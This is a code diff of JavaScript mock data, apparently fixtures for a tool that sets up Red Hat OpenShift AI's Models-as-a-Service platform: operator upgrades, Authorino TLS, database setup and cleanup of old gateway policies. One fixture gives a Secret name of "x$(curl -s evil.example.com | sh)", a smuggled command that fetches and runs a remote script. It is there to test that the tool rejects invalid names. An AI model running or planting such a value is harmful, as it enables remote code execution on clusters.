@@ -953,35 +953,136 @@ oc -n kuadrant-system set env deployment/authorino \\
   SSL_CERT_FILE=/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt \\
   REQUESTS_CA_BUNDLE=/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt
 oc rollout restart deployment/authorino -n kuadrant-system`;
-const RHCL_WARNING = "Red Hat Connectivity Link 1.4.3 is installed; the MaaS docs ask for 1.5 or later (OLM channel stable-1.5): on 1.4.x a caller with two or more subscriptions can hang. A cluster-admin upgrades it; MaaS works for a single subscription meanwhile.";
+const RHCL_WARNING = "Red Hat Connectivity Link 1.4.3 is installed; the MaaS docs ask for 1.5 or later with RHOAI 3.6: on 1.4.x a caller with two or more subscriptions can hang. MaaS works for a single subscription meanwhile. Upgrade Connectivity Link takes the upgrade path OLM offers, one channel at a time, and sets up Authorino TLS again afterwards.";
+const RHCL_UPGRADE = {
+  id: "upgrade-rhcl", label: "Upgrade Connectivity Link",
+  summary: "Upgrades Red Hat Connectivity Link from 1.4.3 to 1.5 or later, as the MaaS docs ask with RHOAI 3.6, one channel at a time along the path OLM offers. Gateway authentication and rate limits restart during each step; it takes a few minutes.",
+  changes: [
+    "Subscription kuadrant-system/kuadrant-operator: channel stable to stable-1.5 (version 1.5.0). OLM upgrades the operator; there is no way back to 1.4.3.",
+    "If OLM has no path from 1.4.3 straight to 1.5.0 (it then stays at 1.4.3), channel stable-1.4 first, to 1.4.4, then stable-1.5.",
+    "Afterwards, Authorino TLS is set up again where an upgrade step recreated Authorino's Service (which removes its certificate).",
+  ],
+};
+const RHCL_UPGRADE_COMMANDS = `# OLM may have no path from 1.4.3 straight to stable-1.5: go through stable-1.4 first
+oc patch subscription 'kuadrant-operator' -n 'kuadrant-system' --type=merge -p '{"spec":{"channel":"stable-1.4"}}'
+# once rhcl-operator.v1.4.4 is installed:
+oc patch subscription 'kuadrant-operator' -n 'kuadrant-system' --type=merge -p '{"spec":{"channel":"stable-1.5"}}'`;
+const RHCL_INSTALL_COMMANDS = `oc apply -f - <<'EOF'
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: kuadrant-system
+---
+apiVersion: operators.coreos.com/v1
+kind: OperatorGroup
+metadata:
+  name: kuadrant-operator-group
+  namespace: kuadrant-system
+---
+apiVersion: operators.coreos.com/v1alpha1
+kind: Subscription
+metadata:
+  name: kuadrant-operator
+  namespace: kuadrant-system
+spec:
+  channel: stable-1.5
+  installPlanApproval: Automatic
+  name: rhcl-operator
+  source: redhat-operators
+  sourceNamespace: openshift-marketplace
+  config:
+    env:
+    - name: RATELIMIT_CHECK_SERVICE_FAILURE_MODE
+      value: deny
+    - name: RATELIMIT_REPORT_SERVICE_FAILURE_MODE
+      value: deny
+EOF
+oc wait --for=jsonpath='{.status.state}'=AtLatestKnown subscription/kuadrant-operator -n kuadrant-system --timeout=300s`;
+const AUTHORINO_ACTION = {
+  id: "authorino-tls", label: "Configure Authorino TLS",
+  summary: "Applies the steps of the MaaS docs' setup-authorino-tls.sh to Connectivity Link's Authorino in kuadrant-system (missing: trust of the service CA (SSL_CERT_FILE)). Only what is not set yet changes; Authorino restarts. It stays after Remove: RHOAI's inference gateway uses Authorino too.",
+  changes: [
+    "Service kuadrant-system/authorino-authorino-authorization: annotation service.beta.openshift.io/serving-cert-secret-name=authorino-server-cert (service-ca makes the certificate)",
+    "Authorino kuadrant-system/authorino: spec.listener.tls enabled, certSecretRef authorino-server-cert",
+    "Deployment kuadrant-system/authorino: SSL_CERT_FILE and REQUESTS_CA_BUNDLE at the service CA (/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt), unless it trusts the service CA already; then a rollout restart",
+  ],
+};
+const TIER_POLICIES = {
+  id: "tier-policies", title: "Old gateway policies", docUrl: `${MAAS_DOCS}migration/upgrade-to-3.4.md#phase-4-manual-cleanup-of-old-tier-resources`, state: "manual", notManaged: true,
+  message: "AuthPolicy gateway-auth-policy, TokenRateLimitPolicy gateway-tier-rate-limits are on maas-default-gateway and are not managed by maas-controller. RHOAI's upgrade from the tier-based MaaS leaves its gateway policies in place, and with old and new gateway policies \"Kuadrant behavior is undefined\" (the MaaS docs' upgrade guide), so this tool publishes nothing until they are gone.",
+  commands: "oc delete authpolicy 'gateway-auth-policy' -n openshift-ingress\noc delete tokenratelimitpolicy 'gateway-tier-rate-limits' -n openshift-ingress",
+  actions: [{ id: "remove-tier-policies", label: "Remove the old tier policies", danger: true,
+    summary: "Deletes the gateway policies of the tier-based MaaS that RHOAI's upgrade leaves behind, as the MaaS docs' upgrade guide (Phase 4) does by hand. maas-controller's own policies stay. Clients that relied on the old tiers' rules lose them.",
+    changes: ["Deleted: AuthPolicy openshift-ingress/gateway-auth-policy (targets maas-default-gateway; not managed by maas-controller)", "Deleted: TokenRateLimitPolicy openshift-ingress/gateway-tier-rate-limits (targets maas-default-gateway; not managed by maas-controller)"] }],
+};
 
-/** The platform's parts by state: "none" (not set up), "starting", "ready", "foreign" (someone else's). */
-export function maasParts(state, { tls = true } = {}) {
+/**
+ * The platform's parts by state, in setup order (pkg/cluster
+ * GetMaaSStatus): "none" (not set up), "starting", "ready", "foreign"
+ * (someone else's). rhcl: "1.4.3" (installed by someone, below the docs'
+ * minimum), "1.5.0" (installed), or "missing" (a cluster that never had
+ * MaaS: nothing of Connectivity Link, Kuadrant or CloudNativePG).
+ */
+export function maasParts(state, { tls = true, rhcl = "1.4.3", tierPolicies = false, cnpg = true } = {}) {
   const tool = state !== "foreign";
   const ready = state === "ready" || state === "foreign";
   const on = state !== "none";
-  return [
-    { id: "dsc", title: "MaaS in the DataScienceCluster", docUrl: `${MAAS_DOCS}install/maas-setup.md#configure-datasciencecluster`,
-      ...(on ? { state: ready ? "ready" : "waiting", message: ready ? "aigateway and modelsAsAService are Managed" : "modelsAsAService is Managed; not ready: deployments are starting", managedByTool: tool, notManaged: !tool }
-        : { state: "missing", message: "modelsAsAService is Removed; setup sets it to Managed, last" }) },
-    { id: "kuadrant", title: "Connectivity Link (Kuadrant)", docUrl: `${MAAS_DOCS}install/platform-setup.md`, state: "ready", message: "Kuadrant kuadrant-system/kuadrant is Ready", notManaged: true, warning: RHCL_WARNING },
+  const fresh = rhcl === "missing";
+  const parts = [
+    fresh ? { id: "rhcl", title: "Red Hat Connectivity Link", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "missing",
+      message: "Not installed. Set up installs version 1.5.0 from redhat-operators (channel stable-1.5), as the MaaS docs' platform setup does.", commands: RHCL_INSTALL_COMMANDS }
+      : { id: "rhcl", title: "Red Hat Connectivity Link", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", notManaged: true,
+        message: `Version ${rhcl} runs (Subscription kuadrant-system/kuadrant-operator, channel ${rhcl === "1.4.3" ? "stable" : "stable-1.5"})`,
+        ...(rhcl === "1.4.3" ? { warning: RHCL_WARNING, actions: [RHCL_UPGRADE], commands: RHCL_UPGRADE_COMMANDS } : {}) },
+    fresh ? { id: "kuadrant", title: "Kuadrant CR", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "missing",
+      message: "No Kuadrant CR. Set up creates kuadrant-system/kuadrant once Connectivity Link runs, as the docs' platform setup does.", commands: "oc apply -f - <<'EOF'\napiVersion: kuadrant.io/v1beta1\nkind: Kuadrant\nmetadata:\n  name: kuadrant\n  namespace: kuadrant-system\nEOF" }
+      : { id: "kuadrant", title: "Kuadrant CR", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", message: "Kuadrant kuadrant-system/kuadrant is Ready", notManaged: true },
+    !cnpg || fresh ? { id: "cnpg", title: "CloudNativePG operator", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`, state: "missing",
+      message: "Not installed. Set up installs version 1.27.1 from certified-operators (channel stable-v1) for this tool's database. Or a cluster-admin creates Secret maas-db-config for a PostgreSQL of their own (maas-setup.md).",
+      commands: "oc apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: cnpg-system\n---\napiVersion: operators.coreos.com/v1\nkind: OperatorGroup\nmetadata:\n  name: cloudnative-pg\n  namespace: cnpg-system\n---\napiVersion: operators.coreos.com/v1alpha1\nkind: Subscription\nmetadata:\n  name: cloudnative-pg\n  namespace: cnpg-system\nspec:\n  channel: stable-v1\n  installPlanApproval: Automatic\n  name: cloudnative-pg\n  source: certified-operators\n  sourceNamespace: openshift-marketplace\nEOF" }
+      : { id: "cnpg", title: "CloudNativePG operator", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`, state: "ready", message: "Version 1.27.1 runs in cnpg-system", notManaged: true },
     { id: "database", title: "Database (PostgreSQL) and maas-db-config", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`,
-      ...(!on ? { state: "missing", message: `Setup runs a one-instance CloudNativePG database (development and test use) in ${MAAS_INFRA}` }
+      ...(!on ? (fresh ? { state: "missing", message: `Set up creates namespace ${MAAS_INFRA}, the AI gateway's infrastructure namespace, as the docs' setup-database.sh does (RHOAI makes it only once MaaS is on, and the database must come first), then runs a one-instance CloudNativePG database there (development and test use).` }
+        : { state: "missing", message: `Set up runs a one-instance CloudNativePG database (development and test use) in ${MAAS_INFRA}` })
         : tool ? { state: "ready", managedByTool: true, message: `CloudNativePG ${MAAS_INFRA}/maas-db runs (1 instance, development and test use); Secret maas-db-config set` }
           : { state: "ready", notManaged: true, message: `Secret ${MAAS_INFRA}/maas-db-config exists: maas-api uses the database it names` }) },
     { id: "gateway", title: "Gateway maas-default-gateway", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`,
       ...(on ? { state: "ready", message: "Programmed at a1b2c3.elb.us-east-1.amazonaws.com", managedByTool: tool, notManaged: !tool }
-        : { state: "missing", message: `Setup creates it with an external load balancer at https://maas.${APPS}` }) },
-    tls === "invalid-secret" ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`, state: "manual", notManaged: true,
+        : { state: "missing", message: `Set up creates it with an external load balancer at https://maas.${APPS}` }) },
+    tls === "invalid-secret" ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "problem",
       message: "Not configured: the Service's serving certificate. Authorino's CR names its certificate Secret \"x$(curl -s evil.example.com | sh)\" (spec.listener.tls.certSecretRef.name), which is not a valid Kubernetes name, so no commands are shown. A cluster-admin checks Authorino authorino in kuadrant-system. Without it, API keys are refused." }
-    : tls ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`, state: "ready", message: "Authorino in kuadrant-system serves TLS and trusts the service CA", notManaged: true }
-      : { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`, state: "manual", notManaged: true, commands: MAAS_AUTHORINO_COMMANDS,
-        message: "Not configured: trust of the service CA (SSL_CERT_FILE). A cluster-admin runs the docs' setup-authorino-tls.sh commands below (this tool does not change Connectivity Link's Authorino). Without it, API keys are refused." },
+    : fresh ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "missing", message: "Set up configures it once Kuadrant has made Authorino, as the docs' setup-authorino-tls.sh does." }
+    : tls ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "ready", message: "Authorino in kuadrant-system serves TLS and trusts the service CA", notManaged: !tool || !on, managedByTool: tool && on }
+      : { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "missing", commands: MAAS_AUTHORINO_COMMANDS, actions: [AUTHORINO_ACTION],
+        message: "Not configured: trust of the service CA (SSL_CERT_FILE). Without it, API keys are refused. Set up (or Configure Authorino TLS) applies the docs' setup-authorino-tls.sh steps in kuadrant-system." },
+    ...(tierPolicies ? [TIER_POLICIES] : []),
+    { id: "dsc", title: "MaaS in the DataScienceCluster", docUrl: `${MAAS_DOCS}install/maas-setup.md#configure-datasciencecluster`,
+      ...(on ? { state: ready ? "ready" : "waiting", message: ready ? "aigateway and modelsAsAService are Managed" : "modelsAsAService is Managed; not ready: deployments are starting", managedByTool: tool, notManaged: !tool }
+        : { state: "missing", message: `aigateway is ${fresh ? "Removed" : "Managed"} and modelsAsAService is Removed. Set up sets them to Managed, last, as the docs' DataScienceCluster step does; Remove puts back what this tool changed.`,
+          commands: `oc patch datasciencecluster 'default-dsc' --type=merge -p '{"spec":{"components":{"aigateway":{"managementState":"Managed","modelsAsAService":{"managementState":"Managed"}}}}}'` }) },
     { id: "maas-api", title: "MaaS API (maas-api)", docUrl: `${MAAS_DOCS}install/validation.md`,
       ...(!on ? { state: "missing", message: "The operator creates it once MaaS is turned on" } : ready ? { state: "ready", message: `Available in ${MAAS_INFRA}` } : { state: "waiting", message: "Not available yet (it restarts until the database answers)" }) },
     { id: "tenant", title: "Default tenant and gateway authentication", docUrl: `${MAAS_DOCS}install/maas-setup.md#maastenantconfig-cr`,
       ...(!on ? { state: "missing", message: "The operator creates it once MaaS is turned on" } : ready ? { state: "ready", message: "Tenant models-as-a-service is Ready; the gateway's authentication is enforced" } : { state: "waiting", message: "Waiting for the operator (tenant missing, configuration missing, authentication missing)" }) },
   ];
+  return parts;
+}
+
+/** What Set up would change, for the parts that are missing (pkg/cluster GetMaaSStatus setupPlan). */
+function maasSetupPlan(parts, { fresh }) {
+  const plan = [];
+  const missing = (id) => parts.find((p) => p.id === id)?.state === "missing";
+  if (missing("rhcl")) plan.push("Install Red Hat Connectivity Link 1.5.0: Namespace kuadrant-system, OperatorGroup kuadrant-system/kuadrant-operator-group, Subscription kuadrant-system/kuadrant-operator (package rhcl-operator, channel stable-1.5, from redhat-operators, with spec.config.env RATELIMIT_CHECK_SERVICE_FAILURE_MODE=deny and RATELIMIT_REPORT_SERVICE_FAILURE_MODE=deny, as the MaaS docs recommend, so requests are refused rather than let through unlimited while Limitador is unavailable)");
+  if (missing("kuadrant")) plan.push("Create the Kuadrant CR kuadrant-system/kuadrant");
+  if (missing("cnpg")) plan.push("Install CloudNativePG 1.27.1: Namespace cnpg-system, OperatorGroup cnpg-system/cloudnative-pg, Subscription cnpg-system/cloudnative-pg (package cloudnative-pg, channel stable-v1, from certified-operators; in its own namespace, not openshift-operators, where an install can pull an OSSM upgrade that breaks the gateway)");
+  if (missing("database")) {
+    if (fresh) plan.push(`Create namespace ${MAAS_INFRA} (the AI gateway's infrastructure namespace; recorded, and deleted by Remove when nothing else is in it)`);
+    plan.push(`Run a one-instance CloudNativePG database ${MAAS_INFRA}/maas-db (1 GiB volume, for development and test) and write Secret ${MAAS_INFRA}/maas-db-config with its address`);
+  }
+  if (missing("gateway")) plan.push(`Create Gateway openshift-ingress/maas-default-gateway with an external load balancer at maas.${APPS} (a cloud cost while it exists), and GatewayClass openshift-default if the cluster has none`);
+  if (missing("authorino-tls")) plan.push("Configure Authorino TLS as the docs' setup-authorino-tls.sh does: the serving-certificate annotation on Service authorino-authorino-authorization, TLS on the Authorino CR's listener, SSL_CERT_FILE on Deployment authorino, then restart it");
+  if (missing("dsc")) plan.push(`DataScienceCluster default-dsc: ${fresh ? "aigateway.managementState Removed to Managed, " : ""}aigateway.modelsAsAService.managementState Removed to Managed (the values before are recorded, and Remove restores them)`);
+  return plan;
 }
 
 /** This tool's model in dev-project (qwen25 unless named): published or not. */
@@ -1043,30 +1144,34 @@ export const maasEmbeddingModel = () => ({
 /** A recorded publication whose model is gone (GetMaaSStatus's extra row). */
 export function maasOrphanPublication(namespace) {
   return { namespace, name: "qwen25-05b-instruct", displayName: "qwen25-05b-instruct", deployed: true, ready: false, managedByTool: true, published: true, partly: true,
-    message: "Partly published: the model is gone; this tool's record of the publication still in place. Unpublish to finish removing it." };
+    message: `Partly published: no model of this name is in project ${namespace} any more (it was deleted there, or the project was); this tool's record of the publication still in place. Unpublish to finish removing it.` };
 }
 
 /** Removal refused because others use MaaS (pkg/cluster teardown, foreignMaaSObjects). */
 export const MAAS_IN_USE = "Others use this MaaS platform: MaaSModelRef team-a/granite-3-8b, MaaSSubscription models-as-a-service/team-a-subscription. Removing it would break them. They unpublish and remove theirs first. Nothing was deleted.";
 
 /** The MaaS status by state. */
-export function maasWorld(state = "none", { tls = true, items = [], blocked = null, noCNPG = false } = {}) {
-  const parts = maasParts(state, { tls });
-  if (noCNPG) Object.assign(parts[2], { state: "manual", message: "The CloudNativePG operator is not installed. A cluster-admin installs it from OperatorHub (certified operators), or creates Secret maas-db-config for a PostgreSQL of their own (maas-setup.md)." });
+export function maasWorld(state = "none", { tls = true, items = [], blocked = null, noCNPG = false, rhcl = state === "none" ? "1.4.3" : "1.5.0", tierPolicies = false } = {}) {
+  const parts = maasParts(state, { tls, rhcl, tierPolicies, cnpg: !noCNPG });
+  const shared = ["rhcl", "kuadrant", "cnpg", "authorino-tls", "tier-policies"];
   const allReady = parts.every((p) => p.state === "ready");
-  const tool = parts.some((p) => p.managedByTool);
+  const tool = parts.some((p) => p.managedByTool && !shared.includes(p.id));
+  const waiting = parts.filter((p) => p.state !== "ready" && p.state !== "missing").map((p) => p.title);
+  const setupPlan = blocked ? [] : maasSetupPlan(parts, { fresh: rhcl === "missing" });
+  const notReady = parts.find((p) => p.state !== "ready");
   return {
     ...(blocked ? { blocked } : {}),
     platform: {
       namespace: MAAS_INFRA, deployed: state !== "none", ready: allReady, managedByTool: tool,
-      message: allReady ? "Ready" : state === "none" ? "Not set up" : "Needs attention",
-      ...(blocked ? { setupBlockedReason: blocked.reason } : noCNPG ? { setupBlockedReason: parts[2].message } : {}),
+      message: allReady ? "Ready" : state === "none" && waiting.length === 0 ? "Not set up" : `Needs attention: ${waiting.join(", ")}`,
+      ...(blocked ? { setupBlockedReason: blocked.reason } : {}),
       ...(!tool ? { teardownBlockedReason: "No part of the MaaS platform was set up by this tool, so there is nothing for it to remove." } : {}),
     },
     parts, url: `https://maas.${APPS}`, subscription: "rhoai-nightly-updater-subscription", dashboardUrl: DASHBOARD_URL,
-    items: items.map((i) => (i.published || allReady ? i : { ...i, setupBlockedReason: "Set up the MaaS platform first." })),
+    ...(setupPlan.length ? { setupPlan } : {}),
+    items: items.map((i) => (i.published || allReady || !notReady ? i : { ...i, setupBlockedReason: state === "none" && !tool ? "Set up the MaaS platform first." : `The MaaS platform is not ready: ${notReady.title} (see above).` })),
   };
 }
 
-export const MAAS_BLOCKED = { component: "aigateway", dsc: "default-dsc", state: "Removed",
-  reason: "MaaS runs in RHOAI's AI gateway, which is Removed in DataScienceCluster default-dsc. A cluster-admin sets aigateway to Managed on the Components page (MaaS platform setup, platform-setup.md); then MaaS can be set up here." };
+export const MAAS_BLOCKED = { component: "aigateway",
+  reason: "MaaS needs RHOAI's DataScienceCluster, and this cluster has none. A cluster-admin creates one on the Components page." };
